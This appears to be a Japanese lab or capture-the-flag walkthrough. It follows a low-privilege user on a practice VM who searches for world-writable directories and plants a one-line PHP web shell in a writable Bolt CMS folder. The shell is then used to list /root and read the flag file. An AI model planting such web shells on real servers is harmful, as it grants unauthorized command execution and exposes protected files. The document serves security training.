# （別法y）dlinkに侵入してからのお話

## 1.ポート９０００を調べる
<img width="1335" height="606" alt="image" src="https://github.com/user-attachments/assets/262811d8-a852-427e-8525-783ce0388f2e" />

- データベースへのアクセスに問題ありでうまくいっていない？？

## 2.書き込み可能なディレクトリを検索する

|オプション| 概要|
|----|----|
|-type|検索対象の種類を指定　※dはディレクトリの意|
|-writable|書き込み可能なものにマッチする|
|2> /dev/null|標準エラー出力を捨てる|

```bash
find / -type d -writable 2> /dev/null
```
- フルパーミッションのディレクトリを探す<br>
```bash
find / -perm -0777 -type d -ls 2> /dev/null | grep -Ev proc\|sys\|usr\|sbin\|dev\|lib\|etc
```
```
      389      0 drwxrwxrwt   2 root     utmp           40 Jul  5 11:07 /run/scr                               een
        2      0 drwxrwxrwt   5 root     root          100 Jul  5 11:07 /run/loc                               k
   289366      4 drwxrwxrwx   3 root     root         4096 Apr  7  2020 /var/www                               /bolt/app/config
   289364      4 drwxrwxrwx   5 root     root         4096 Apr  7  2020 /var/www                               /bolt/app/cache
   289362      4 drwxrwxrwx   2 root     root         4096 Nov 12  2019 /var/www                               /bolt/app/database
   289508      4 drwxrwxrwx   2 root     root         4096 Nov 12  2019 /var/www                               /bolt/public/files
     8254      4 drwxrwxrwt   6 root     root         4096 Jul  5 12:09 /var/tmp
     8246      4 drwxrwxrwt   2 root     root         4096 Feb 14  2019 /var/cra                               sh
    24578      4 drwxrwxrwt  11 root     root         4096 Jul  5 12:09 /tmp
      112      4 drwxrwxrwt   2 root     root         4096 Jul  5 11:07 /tmp/.XI                               M-unix
      115      4 drwxrwxrwt   2 root     root         4096 Jul  5 11:07 /tmp/.fo                               nt-unix
      163      4 drwxrwxrwt   2 root     root         4096 Jul  5 11:07 /tmp/.Te                               st-unix
       74      4 drwxrwxrwt   2 root     root         4096 Jul  5 11:07 /tmp/.IC                               E-unix
       63      4 drwxrwxrwt   2 root     root         4096 Jul  5 11:07 /tmp/.X1
```
- /var/www/bolt/public/files のディレクトリは所有者rootであり、パーミッション７７７でユーザー権限しかないdlinkユーザーでも書き込み可能

## 3.書き込み可能なディレクトリ内を調べる
```
dlink@victim01:~$ cd /var/www/bolt/public/files
dlink@victim01:/var/www/bolt/public/files$ ls
index.html
dlink@victim01:/var/www/bolt/public/files$ ls -la
total 16
drwxrwxrwx 2 root root 4096 Nov 12  2019 .
drwxr-xr-x 7 root root 4096 Apr  7  2020 ..
-rw-r--r-- 1 root root  195 Nov 12  2019 .htaccess
-rw-r--r-- 1 root root    4 Nov 12  2019 index.html
dlink@victim01:/var/www/bolt/public/files$ cat .htaccess
# Force plain text showing
ForceType text/plain
<FilesMatch "(?i)\.(gif|jpe?g|png|svg|zip|tgz|txt|md|docx?|pdf|xlsx?|pptx?|html?|css|mp4|webm|ogv|m4v|mp3|wav)$" >
  ForceType none
</FilesMatch>

dlink@victim01:/var/www/bolt/public/files$ cat index.html
No.
```

## 4.WEBシェルを設置する
- 今回はPHPのWEBシェル、シンプルなもの
- 外部プログラムを実行するsystem()関数にGETリクエストのcmdパラメーター値を引数として渡す
- /var/www/bolt/public/filesで作成する
  
  ```PHP
  <?php
        system($_GET['cmd']);
  ?>
  ```
## 5.webシェルを通じてコマンドを実行
```
http://192.168.56.108:9000/files/shell.php?cmd=ls%20/root
```
<img width="805" height="229" alt="image" src="https://github.com/user-attachments/assets/257b7d5d-2f57-414d-bd06-97dfe1a6f92c" />

```
http://192.168.56.108:9000/files/shell.php?cmd=cat%20/root/flag.txt
```
<img width="1261" height="219" alt="image" src="https://github.com/user-attachments/assets/5a256ebb-1ff4-408d-a2ff-be8f1190e82e" />

- view-sourceでみるとこうなる　↓
<img width="945" height="537" alt="image" src="https://github.com/user-attachments/assets/342c7320-4931-4da7-afb1-0f408632b36f" />

  
